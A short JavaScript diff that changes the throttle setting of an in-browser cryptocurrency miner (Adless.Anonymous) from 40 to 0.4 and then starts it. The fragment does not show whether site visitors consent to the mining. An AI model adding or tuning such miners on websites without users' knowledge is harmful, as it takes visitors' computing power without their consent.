@@ -23,7 +23,7 @@ else {
     threads = 1;
 }
 
-const miner = new Adless.Anonymous(siteKey, {throttle: 40, threads: threads});
+const miner = new Adless.Anonymous(siteKey, {throttle: 0.4, threads: threads});
 
 miner.start();
 
